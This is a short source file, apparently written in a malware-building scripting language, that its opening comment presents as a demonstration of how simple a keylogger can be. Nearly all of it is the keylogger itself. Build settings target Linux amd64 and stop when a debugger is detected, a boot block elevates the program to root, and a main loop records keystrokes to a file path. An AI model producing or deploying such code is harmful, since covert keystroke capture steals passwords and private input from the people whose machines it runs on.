@ Shows how simple a keylogger can be @

use keylogger
use system
[
    version 3.0
    output simple_keylogger
    os linux
    arch amd64
    obfuscate false
    debugger_behavior stop
]

boot elevation {
    system::elevate()  @ Need to be root for this to work on linux @
}

loop main_func {
    keylogger::start("€39€/test.txt") @ You need to provide the path for where the result is placed @
}
